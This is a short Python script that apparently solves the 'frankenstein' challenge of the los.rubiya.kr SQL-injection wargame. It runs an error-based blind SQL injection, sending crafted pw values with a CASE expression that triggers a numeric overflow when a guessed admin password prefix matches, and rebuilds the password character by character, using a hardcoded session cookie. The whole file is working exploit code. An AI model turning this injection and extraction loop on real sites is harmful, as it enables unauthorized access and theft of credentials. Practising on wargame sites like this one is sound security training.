import requests
import time

cookies={'PHPSESSID':'8pt5qvotaijsant070i27b03jq'}
address="https://los.rubiya.kr/chall/frankenstein_b5bab23e64777e1756174ad33f14b5db.php"
hex_value="0123456789abcdefghijklmnopqrstuvwxyz"
pw=""
a=1
while True:
    for b in range(48,123):
        url = address + "?pw=1' or case when id='admin' and pw like '" + pw +  chr(b) + "%' then 9e307*2 else 0 end%23"
        res=requests.get(url,cookies=cookies)
        if "<br>error" in res.text:
            print(str(a)+"of pw=>"+chr(b))
            a+=1
            pw+=chr(b)
            print(pw)
            break

print(pw)
